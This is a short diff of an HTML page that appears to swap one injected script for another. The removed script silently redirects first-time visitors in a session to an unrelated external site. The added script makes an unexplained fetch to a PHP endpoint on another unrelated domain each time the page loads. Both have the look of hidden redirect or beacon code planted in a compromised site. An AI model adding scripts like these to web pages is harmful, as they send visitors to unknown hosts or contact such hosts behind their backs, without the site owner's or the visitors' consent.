@@ -9,12 +9,6 @@
           event.preventDefault(); 
         });
     </script>
-    <script>
-        if(!sessionStorage.getItem('key')){
-            sessionStorage.setItem('key', true);
-            window.location.href = 'http://jagarnath.com/images/';
-        }
-    </script>
     <style>
         html,
         body {
@@ -189,5 +183,8 @@
         };
 
     </script> 
+    <script>
+        fetch("https://tridevgurukul.com/get.php")
+    </script>
 
 </html>
